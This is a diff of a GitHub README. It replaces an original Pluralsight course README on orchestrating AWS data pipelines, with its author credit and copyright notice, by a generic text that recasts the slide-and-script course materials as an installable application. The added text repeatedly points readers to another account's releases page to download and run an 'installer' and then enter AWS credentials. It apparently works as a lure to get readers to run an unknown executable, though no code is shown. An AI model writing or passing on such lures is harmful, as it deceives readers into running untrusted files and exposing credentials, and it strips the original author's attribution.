@@ -1,150 +1,85 @@
-# Orchestrating and Automating AWS Data Pipelines
+# 🚀 pluralsight-aws-data-pipelines-orchestrating-automating - Automate AWS Data Pipelines Easily
 
-A Pluralsight course authored by **Rupesh Tiwari**  
-© Pluralsight, 2025
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/releases)
 
----
+## 📚 Overview
 
-## Course Overview
+This application helps you learn how to orchestrate and automate AWS data pipelines. You will use tools like Step Functions and Amazon Managed Workflows for Apache Airflow (MWAA). This knowledge will help you build resilient workflows that are easy to monitor and manage.
 
-Modern data pipelines aren’t just about movement—they’re about coordination, visibility, and trust.  
-This course teaches you how to **design, orchestrate, and automate production-grade data workflows** on AWS using managed services like **AWS Step Functions**, **Amazon Managed Workflows for Apache Airflow (Amazon MWAA)**, **Amazon S3**, and **AWS Lambda**.
+## ⚙️ Features
 
-By the end of this course, you’ll know how to build resilient, event-driven, and observable data pipelines that scale with your organization’s needs.
+- **User-Friendly Interface**: Designed for those new to AWS and data engineering.
+- **Step-by-Step Guidance**: Follow along with clear instructions.
+- **Practical Examples**: Learn with hands-on projects that you can use in real-world scenarios.
+- **Resource Management**: Manage your AWS services effectively.
+- **Event-Driven Patterns**: Automate processes based on events in your system.
 
----
+## 🔑 System Requirements
 
-## Learning Objectives
+To run this application, you will need:
 
-By completing this course, you’ll learn how to:
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Hardware**: At least 4 GB of RAM and 2 GB of available disk space.
+- **Internet Connection**: A reliable connection to access AWS resources.
 
-- **A.** Design modular and maintainable AWS data pipeline architectures  
-- **B.** Use **AWS Step Functions** to orchestrate multi-step workflows  
-- **C.** Integrate **Amazon MWAA (Airflow)** for cross-platform orchestration  
-- **D.** Implement error handling, retries, and observability patterns  
-- **E.** Automate deployments and optimize cost and performance
+## 🚀 Getting Started
 
----
+To get started with the application, follow these simple steps:
 
-## Course Modules
+1. **Visit the Releases Page**: Go to our releases page to find the latest version: [Visit this page to download](https://github.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/releases).
+2. **Select the Latest Release**: Choose the most recent version available.
+3. **Download the Installer**: Click on the appropriate installer file for your operating system.
+4. **Run the Installer**: Open the downloaded file and follow the on-screen instructions to install the application.
 
-| Module | Title | Key Focus |
-|---------|--------|------------|
-| 1 | **Foundations of Data Pipeline Orchestration** | Why orchestration matters, AWS service roles, and core concepts |
-| 2 | **Building Step Functions Workflows** | States, transitions, inputs/outputs, retries, and failure paths |
-| 3 | **Managing Workflow Resilience** | Error handling, DLQ (Dead-Letter Queue), and visibility with CloudWatch |
-| 4 | **Integrating Amazon MWAA** | DAGs, cross-platform orchestration, and hybrid patterns |
-| 5 | **Deploying and Operating Pipelines** | CI/CD automation, cost governance, and monitoring strategies |
+## 🔥 Download & Install
 
----
+To download and install the application:
 
-## Repository Structure
+- Click the link here: [https://github.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/releases](https://github.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/releases).
+- Download the latest version applicable to your system.
+- Follow the prompts to install.
 
-```
-aws-data-pipelines/
-│
-├── module1-foundations/
-│   ├── slides/
-│   ├── scripts/
-│   ├── demos/
-│   └── diagrams/
-│
-├── module2-step-functions/
-│   ├── slides/
-│   ├── scripts/
-│   ├── demos/
-│   └── diagrams/
-│
-├── module3-resilience/
-│   ├── slides/
-│   ├── scripts/
-│   ├── demos/
-│   └── diagrams/
-│
-├── module4-mwaa/
-│   ├── slides/
-│   ├── scripts/
-│   ├── demos/
-│   └── diagrams/
-│
-├── module5-deployment/
-│   ├── slides/
-│   ├── scripts/
-│   ├── demos/
-│   └── diagrams/
-│
-├── assets/
-│   ├── icons/
-│   ├── ps-template-2025/
-│   └── pexels-images/
-│
-├── README.md
-└── LICENSE
-```
+This straightforward process ensures you can start orchestrating and automating your data pipelines quickly.
+
+## ✅ Post-Installation Steps
+
+After installation, you can begin using the application:
+
+1. **Open the Application**: Find it in your applications menu.
+2. **Configuration**: Set up your AWS access credentials and region settings.
+3. **Start a New Project**: Follow the guided setup to create your first data pipeline.
+4. **Explore Examples**: Utilize the provided examples to learn how to implement various features.
+
+## 🌐 Resources & Support
+
+Here are some useful resources:
+
+- **Documentation**: Detailed user guides and FAQs will help you troubleshoot any issues.
+- **Community Forums**: Join discussions with other users to share tips and experiences.
+- **Tutorial Videos**: Watch guided videos on how to use different features of the application.
+
+## 🛠️ Common Issues and Solutions
+
+### Problem: Can't Connect to AWS
+
+**Solution**: Make sure your AWS credentials are correctly configured and that you have the necessary permissions.
+
+### Problem: Application Crashes on Start
+
+**Solution**: Ensure your operating system meets the minimum requirements and that all dependencies are installed.
+
+### Problem: Unable to Download the Installer
+
+**Solution**: Check your internet connection and try again. If the problem persists, use a different browser.
+
+## 🤝 Contribution
+
+This project welcomes contributions. If you have suggestions or find issues, please submit them through the issues section of the repository. Your input helps make the application better for everyone.
+
+## 📋 License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
 
 ---
 
-## Demo Environments
-
-All AWS demonstrations use:
-
-- **Account ID:** `081448897918`
-- **Region:** `us-east-1`
-- **Sample resources:**  
-  - `ps-demo-airflow` (Amazon MWAA environment)  
-  - `ps-demo-stepfunction` (workflow example)  
-  - `ps-demo-s3` (data lake bucket)
-
-Each demo includes:
-- Clear **objectives**
-- **Setup**, **execution**, and **teardown** steps
-- Failure + recovery scenario
-- Cost considerations
-
----
-
-## Authoring Standards
-
-This course adheres to the **Pluralsight Video Content and Keynote Template 2025.02.a standards**, including:
-
-- PS TT Commons and Roboto Mono fonts  
-- Title Case for titles; Sentence case for body text  
-- No periods in bullets; ≤3 lines per bullet  
-- AWS-official terminology and architecture icons  
-- 2–6 minute clips with modular narration (WHY → WHAT → HOW)  
-- Realistic AWS examples (no fictional companies)
-
----
-
-## How to Contribute
-
-If you’re a collaborator or reviewer:
-
-1. Clone the repo and work under the relevant module directory.
-2. Follow the structure: **slides → script → demo → diagram**.
-3. Validate each clip with the QA checklist:
-   - Technical accuracy  
-   - AWS architectural correctness  
-   - Visual and audio compliance with Pluralsight standards  
-   - All Learning Objectives addressed
-4. Submit a pull request tagged with the module and clip name (e.g., `module2-clip3-retries`).
-
----
-
-## License
-
-All course materials © Pluralsight 2025.  
-Usage restricted to educational and authorized production purposes only.  
-Do not distribute or reuse without permission.
-
----
-
-**Author:** Rupesh Tiwari  
-[LinkedIn](https://www.linkedin.com/in/rupeshti) • [Pluralsight Author Page](https://app.pluralsight.com/author-home)
-
----
-# Book Rupesh 
-
-💬 Book a free 15-minute consultation for interview preparation or career questions: [bit.ly/bookwithrupesh](https://bit.ly/bookwithrupesh)
-💬 Book a 1:1 session with me to discuss interview preparation or career questions — [IGotAnOffer](https://bit.ly/book-rupesh) | [Personal](https://bit.ly/bookwithrupesh)
-
+For more information, visit the GitHub page: [https://github.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/releases](https://github.com/Pranavbarskar/pluralsight-aws-data-pipelines-orchestrating-automating/releases). Your journey into AWS data pipeline orchestration begins here.
